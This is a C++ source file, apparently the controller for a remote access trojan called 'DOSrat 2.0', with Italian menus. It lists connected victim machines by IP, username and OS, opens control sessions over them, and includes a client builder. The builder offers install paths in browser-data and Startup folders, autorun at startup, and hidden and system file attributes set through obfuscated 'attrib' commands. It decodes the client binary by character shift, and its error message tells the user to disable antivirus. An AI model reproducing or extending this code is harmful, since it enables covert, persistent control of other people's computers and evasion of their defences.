#include <iostream>
#include <obfuscate.h>
#include <EssNet.h>
#include <Essentials.h>
#include <EssCurl.h>
#include <zlib.h>

using namespace std;

#define MAX_CLIENTS 1000

#include "Client.hpp"

string Version = "2.0.0-b.7";
CLIENT Clients[MAX_CLIENTS];
atomic<bool> ServerLoopController = true;

#include "SettaggiServer.hpp"
#include "SettaggiClient.hpp"
#include "ClientUtils.hpp"
#include "CliFileExplorer.hpp"

ClientUtils Clu;


#include "UIutils.hpp"
#include "UpdateService.hpp"
#include "Comunicazioni.hpp"
#include "Sessione.hpp"

int main()
{
    CLInterface cli;
    TextColor tc;
    DirUtils du;
    SettaggiServer SettaggiS;
    SettaggiClient SettaggiC;
    ConsoleUtils cu;
    WindowUtils wu;
    TcpIP Server;
    Encode en;
    SystemUtils su;
    Clu = ClientUtils(SettaggiS);
    Sessione Sess;

    VectString MenuPrincipale;
    VectString HeaderTabella;
    VectString BodyTabella;
    VectString Percorsi;

    bool CicloMenu = true;
    bool ServerOn = false;
    int OldPort = 0;

    Clu.AggiornaTitolo(Clu.Loading);
	
    cli.LoadingPercentage = 0;
    cli.LoadingText = "Caricamento Menu Principale...";
    cli.FullBarWithText(25);

    MenuPrincipale.push_back("Esci");
    MenuPrincipale.push_back("Connetti Sessione");
    MenuPrincipale.push_back("Crea Client");
    MenuPrincipale.push_back("Comandi Comuni");
    MenuPrincipale.push_back("Impostazioni");

    cli.LoadingPercentage = 10;
    cli.LoadingText = "Caricamento Tabella Clients...";

    HeaderTabella.push_back("ID");
    HeaderTabella.push_back("IP");
    HeaderTabella.push_back("Ver");
    HeaderTabella.push_back("UAC");
    HeaderTabella.push_back("Nome PC");
    HeaderTabella.push_back("UserName");
    HeaderTabella.push_back("OS");
    HeaderTabella.push_back("Stato");

    cli.LoadingPercentage = 15;
    cli.LoadingText = "Caricamento Percorsi...";

    Percorsi.push_back("C:\\Users\\<User>\\Documents");
    Percorsi.push_back("C:\\Users\\<User>\\AppData\\Local\\Discord");
    Percorsi.push_back("C:\\Users\\<User>\\AppData\\Local\\Google\\Chrome\\User Data");
    Percorsi.push_back("C:\\Users\\<User>\\AppData\\Local\\Microsoft\\Edge\\User Data");
    Percorsi.push_back("C:\\Users\\<User>\\AppData\\Local\\Microsoft\\WindowsApps");
    Percorsi.push_back("C:\\Users\\<User>\\AppData\\Local\\Temp");
    Percorsi.push_back("C:\\Users\\<User>\\AppData\\LocalLow\\Microsoft");
    Percorsi.push_back("C:\\Users\\<User>\\AppData\\Roaming\\.minecraft");
    Percorsi.push_back("C:\\Users\\<User>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
    Percorsi.push_back("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp");
    Percorsi.push_back("C:\\Windows");

    cli.LoadingPercentage = 20;
    cli.LoadingText = "Rimozione Update...";

    du.SetCurrDir(du.GetModuleFilePath());
    if (du.CheckDir("Update"))
        du.DelDir("Update");

    cli.LoadingPercentage = 30;
    cli.LoadingText = "Caricamento Impostazioni...";

    if (!SettaggiS.GetSettings())
    {
        cli.StopBar();

        tc.SetColor(tc.Red);
        cout << "Errore nel caricamento delle impostazioni." << endl;
        _getch();
        return 0;
    }

    cli.LoadingPercentage = 40;
    cli.LoadingText = "Controllo Aggiornamenti...";

    if (SettaggiS.VerificaAggiornamenti)
        UpdateService::VerificaAggiornamenti(SettaggiS.AutoAggiornamento);

    cli.LoadingPercentage = 50;
    cli.LoadingText = "Impostazione Finestra...";

    wu.SetWindowSize({ SettaggiS.DimensioniFinestra.X, SettaggiS.DimensioniFinestra.Y });

    cli.LoadingPercentage = 60;
    cli.LoadingText = "Avvio Server...";

    Server.Port = SettaggiS.Porta;
    if (Server.StartServer() != 0)
    {
        cli.StopBar();
        ServerOn = false;

        tc.SetColor(tc.Red);
        cout << "Errore nell'avvio del server.\nMolto probabilmente e' dovuto alla porta." << endl;
        tc.SetColor(tc.Default);
        cout << "Premi un tasto per continuare offline..." << endl;
        Server.Stop();
        _getch();
    }
    else
    {
        ServerOn = true;

        cli.LoadingPercentage = 90;
        cli.LoadingText = "Avvio Servizi...";

        thread Aconn(Comunicazioni::AccettaConnessioni, std::ref(Server), std::ref(SettaggiS.MostraNotifiche));
        thread Vconn(Comunicazioni::VerificaConnessioni);
        Aconn.detach();
        Vconn.detach();

        cli.LoadingPercentage = 100;
        cli.LoadingText = "Completato";
        cli.StopBar();
    }

    while (CicloMenu)
    {
        if (ServerOn)
            Clu.AggiornaTitolo(Clu.Menu);
        else
            Clu.AggiornaTitolo(Clu.Off);
		
        system("cls");
        UIutils::StampaTitolo(1);
        cli.SubTitle("Menu Principale", 60, tc.Green);

        switch (cli.MenuSingleSelQuadre(MenuPrincipale))
        {
            // Esci
            case 0:
            {
                ServerLoopController = false;

                for (int i = 0; i < MAX_CLIENTS; i++)
                    if (Clients[i].IsConnected)
                        Clients[i].Kill();

                Server.Stop();
                CicloMenu = false;
                break;
            }

            // Connetti Sessione
            case 1:
            {
                if (!ServerOn)
                {
                    tc.SetColor(tc.Red);
                    cout << "Funzionalita' non accessibile: sei offline.\nProva a cambiare la porta nelle impostazioni." << endl;
                    tc.SetColor(tc.Default);

                    Sleep(3000);
                    break;
                }

                system("cls");
                UIutils::StampaTitolo(1);
                cli.SubTitle("Lista Clients", 60, tc.Green);

                BodyTabella.clear();
                for (int i = 0; i < MAX_CLIENTS; i++)
                {
                    if (Clients[i].IsConnected)
                    {
                        BodyTabella.push_back(to_string(i));
                        BodyTabella.push_back(Clients[i].info.IP);
                        BodyTabella.push_back(Clients[i].info.Versione);
                        BodyTabella.push_back(Clients[i].info.UAC);
                        BodyTabella.push_back(Clients[i].info.PCname);
                        BodyTabella.push_back(Clients[i].info.UserName);
                        BodyTabella.push_back(Clients[i].info.OS);
                        BodyTabella.push_back(Clients[i].info.Location.CountryCode);
                    }
                }

                if (BodyTabella.size() > 0)
                {
                    int IdClient = -1;
                    bool Controllo = false;
                    string strIdClient;

                    cli.Table(HeaderTabella, BodyTabella);
                    cout << "\nScegli l'ID del Client." << endl;
                    UIutils::StampaPrefix();
                    getline(cin, strIdClient);

                    try { IdClient = stoi(strIdClient); }
                    catch (exception ex) {}

                    if (IdClient < MAX_CLIENTS && IdClient >= 0)
                    {
                        if (Clients[IdClient].IsConnected)
                        {
                            Sess.ID = IdClient;
                            Sess.Sock = Clients[IdClient].sock;
                            
                            Sess.AvviaSessione();
                        }
                        else
                            Controllo = true;
                    }
                    else
                        Controllo = true;

                    if (Controllo)
                    {
                        cout << "ID non valido.";
                        Sleep(2000);
                    }
                }
                else
                {
                    cout << "Non hai Clients connessi." << endl;
                    Sleep(2000);
                }

                break;
            }

            // Crea Client
            case 2:
            {
                while (CicloMenu)
                {
                    system("cls");
                    UIutils::StampaTitolo(1);
                    cli.SubTitle("Crea Client", 60, tc.Green);

                    SettaggiC.GetSettings();

                    switch (SettaggiC.ShowSettings())
                    {
                        // Esci
                        case 0:
                            CicloMenu = false;
                            break;

                        // Host
                        case 1:
                        {
                            cout << "\nInserisci l'host." << endl;
                            UIutils::StampaPrefix();
                            getline(cin, SettaggiC.Host);
                            break;
                        }

                        // Porta
                        case 2:
                        {
                            string strPorta;

                            cout << "\nInserisci la porta." << endl;
                            UIutils::StampaPrefix();
                            getline(cin, strPorta);

                            try { SettaggiC.Porta = stoi(strPorta); }
                            catch (exception ex) {}

                            break;
                        }

                        // Percorso d'Installazione
                        case 3:
                        {
                            cout << "\nScegli il percorso d'installazione." << endl;

                            SettaggiC.InstallPath = Percorsi[cli.MenuSingleSelScorrimento(Percorsi, tc.Purple)];
                            break;
                        }

                        // Nome Exe
                        case 4:
                        {
                            cout << "\nInserisci il nome del file .exe" << endl;
                            UIutils::StampaPrefix();
                            getline(cin, SettaggiC.ExeName);

                            if (SettaggiC.ExeName.size() >= 4)
                            {
                                if (StringUtils::ToLowerCase(SettaggiC.ExeName) == "drunkard")
                                    UIutils::DrunkeranEgg();

                                if (StringUtils::ToLowerCase(SettaggiC.ExeName.substr(SettaggiC.ExeName.size() - 4, 4)) != ".exe")
                                    SettaggiC.ExeName += ".exe";
                            }
                            else
                            {
                                tc.SetColor(tc.Red);
                                cout << "Nome non valido, minimo 4 caratteri." << endl;
                                tc.SetColor(tc.Default);
                                SettaggiC.ExeName = "Client.exe";
                                Sleep(1500);
                            }
                            break;
                        }

                        // Auto Run
                        case 5:
                            SettaggiC.RegStartup = !SettaggiC.RegStartup;
                            break;

                        // File Nascosto
                        case 6:
                            SettaggiC.HideExe = !SettaggiC.HideExe;
                            break;

                        // File di Sistema
                        case 7:
                            SettaggiC.SystemFile = !SettaggiC.SystemFile;
                            break;

                        // Crea Client
                        case 8:
                        {
                            cout << endl;

                            cli.LoadingPercentage = 0;
                            cli.LoadingText = "Preparazione Client";
                            cli.FullBarWithText(30);

                            du.SetCurrDir(du.GetModuleFilePath());

                            if (!du.CheckFile("Build\\Client.exe"))
                            {
                                cli.StopBar();
                                tc.SetColor(tc.Red);
                                cout << "\nErrore: file \"Build\\Client.exe\" non trovato.\nProva a riscaricare DOSrat 2.0." << endl;
                                tc.SetColor(tc.Default);
                                Sleep(5000);
                                break;
                            }

                            cli.LoadingPercentage = 20;

                            du.DelFile(SettaggiC.ExeName);

                            if (!en.CharUnShift(69, "Build\\Client.exe", SettaggiC.ExeName))
                            {
                                cli.StopBar();
                                tc.SetColor(tc.Red);
                                cout << "\nErrore durante la lettura/scrittura del Client.\nDisattiva l'antivirus e riprova." << endl;
                                tc.SetColor(tc.Default);
                                Sleep(5000);
                                break;
                            }

                            cli.LoadingPercentage = 50;
                            cli.LoadingText = "Impostazione attributi";

                            Sleep(250);

                            if (SettaggiC.HideExe)
                                su.NoOutputCMD((string)AY_OBFUSCATE("attrib +h \"") + SettaggiC.ExeName + "\"");
                            if (SettaggiC.SystemFile)
                                su.NoOutputCMD((string)AY_OBFUSCATE("attrib +s \"") + SettaggiC.ExeName + "\"");

                            cli.LoadingPercentage = 75;
                            cli.LoadingText = "Personalizzazione settaggi";

                            if (!du.AppendToFile(SettaggiC.ExeName, en.AsciiToHex("{START}" + SettaggiC.DumpSettingsForBuild() + "{END}")))
                            {
                                Sleep(500);

                                if (!du.AppendToFile(SettaggiC.ExeName, en.AsciiToHex("{START}" + SettaggiC.DumpSettingsForBuild() + "{END}")))
                                {
                                    cli.StopBar();
                                    tc.SetColor(tc.Red);
                                    cout << "\nErrore durante la scrittura dei settaggi.\nRiprova." << endl;
                                    tc.SetColor(tc.Default);
                                    Sleep(3000);

                                    du.DelFile(SettaggiC.ExeName);

                                    break;
                                }
                            }

                            cli.LoadingPercentage = 100;
                            Sleep(100);
                            cli.StopBar();

                            tc.SetColor(tc.Lime);
                            cout << "Creazione client completata!" << endl;
                            tc.SetColor(tc.Default);

                            Sleep(1500);
                            CicloMenu = false;
                            break;
                        }
                    }

                    SettaggiC.SetSettings();
                }

                CicloMenu = true;
                break;
            }

            // Comandi Comuni
            case 3:
            {
                if (!ServerOn)
                {
                    tc.SetColor(tc.Red);
                    cout << "Funzionalita' non accessibile: sei offline.\nProva a cambiare la porta nelle impostazioni." << endl;
                    tc.SetColor(tc.Default);

                    Sleep(3000);
                    break;
                }

                // TODO
                break;
            }

            // Impostazioni
            case 4:
            {
                while (CicloMenu)
                {
                    system("cls");
                    UIutils::StampaTitolo(1);
                    cli.SubTitle("Impostazioni", 60, tc.Green);

                    SettaggiS.GetSettings();

                    switch (SettaggiS.ShowSettings())
                    {
                        // Esci
                        case 0:
                        {
                            CicloMenu = false;
                            break;
                        }

                        // Porta
                        case 1:
                        {
                            string strPorta;
                            OldPort = SettaggiS.Porta;

                            cout << "\nInserisci la porta." << endl;
                            UIutils::StampaPrefix();
                            getline(cin, strPorta);

                            try { SettaggiS.Porta = stoi(strPorta); }
                            catch (exception ex) {}

                            if (OldPort != SettaggiS.Porta)
                            {
                                cout << "Riavvio del Server in corso";
                                cli.DotsBar();

                                ServerOn = Comunicazioni::RestartServer(Server, SettaggiS.Porta, SettaggiS.MostraNotifiche);
                                cli.StopBar(); cout << endl;

                                if (ServerOn)
                                {
                                    Clu.AggiornaTitolo(Clu.Menu);

                                    tc.SetColor(tc.Lime);
                                    cout << "Riavvio completato." << endl;
                                    tc.SetColor(tc.Default);
                                    Sleep(1500);
                                }
                                else
                                {
                                    Clu.AggiornaTitolo(Clu.Off);

                                    tc.SetColor(tc.Red);
                                    cout << "Riavvio del server fallito..." << endl;
                                    tc.SetColor(tc.Default);
                                    Sleep(2000);
                                }
                            }

                            break;
                        }

                        // Aggiornamenti
                        case 2:
                        {
                            SettaggiS.VerificaAggiornamenti = !SettaggiS.VerificaAggiornamenti;
                            if (!SettaggiS.VerificaAggiornamenti)
                                SettaggiS.AutoAggiornamento = false;
                            break;
                        }

                        // Auto Aggiornamenti
                        case 3:
                        {
                            SettaggiS.AutoAggiornamento = !SettaggiS.AutoAggiornamento;
                            break;
                        }

                        // Dimensione della finestra
                        case 4:
                        {
                            cout << "\nRidimensiona la finestra a piacimento e premi invio per salvare." << endl;
                            _getch();

                            SettaggiS.DimensioniFinestra.X = wu.GetWindowSize().X;
                            SettaggiS.DimensioniFinestra.Y = wu.GetWindowSize().Y;
                            break;
                        }

                        // Mostra Notifiche
                        case 5:
                        {
                            SettaggiS.MostraNotifiche = !SettaggiS.MostraNotifiche;
                            break;
                        }
                    }

                    SettaggiS.SetSettings();
                }

                CicloMenu = true;
                break;
            }
        }
    }

    return 0;
}